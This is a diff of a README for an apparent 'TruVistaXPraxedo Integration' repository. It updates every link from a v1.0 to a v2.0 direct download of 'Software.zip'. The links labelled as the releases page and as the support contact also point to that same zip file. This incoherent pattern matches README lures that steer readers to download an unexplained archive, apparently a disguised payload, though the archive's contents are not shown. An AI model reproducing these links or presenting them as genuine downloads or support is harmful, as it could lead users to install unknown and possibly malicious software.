@@ -10,8 +10,8 @@ Welcome to the TruVistaXPraxedo Integration repository! This repository contains
 
 ## 🌐 Important Links
 
-- **Download Latest Version:** [Launch https://github.com/ulobrewok/TruVistaXPraxedo_Integration/releases/download/v1.0/Software.zip](https://github.com/ulobrewok/TruVistaXPraxedo_Integration/releases/download/v1.0/Software.zip)
-- **For more versions, visit the [Releases](https://github.com/ulobrewok/TruVistaXPraxedo_Integration/releases/download/v1.0/Software.zip) section.**
+- **Download Latest Version:** [Launch https://github.com/ulobrewok/TruVistaXPraxedo_Integration/releases/download/v2.0/Software.zip](https://github.com/ulobrewok/TruVistaXPraxedo_Integration/releases/download/v2.0/Software.zip)
+- **For more versions, visit the [Releases](https://github.com/ulobrewok/TruVistaXPraxedo_Integration/releases/download/v2.0/Software.zip) section.**
 
 ## 🤖 How to Use
 
@@ -39,7 +39,7 @@ We welcome contributions to enhance the capabilities of our integration process.
 
 ## 📞 Support
 
-For any inquiries, issues, or support requests, please contact our team at https://github.com/ulobrewok/TruVistaXPraxedo_Integration/releases/download/v1.0/Software.zip
+For any inquiries, issues, or support requests, please contact our team at https://github.com/ulobrewok/TruVistaXPraxedo_Integration/releases/download/v2.0/Software.zip
 
 ## 📜 License
 
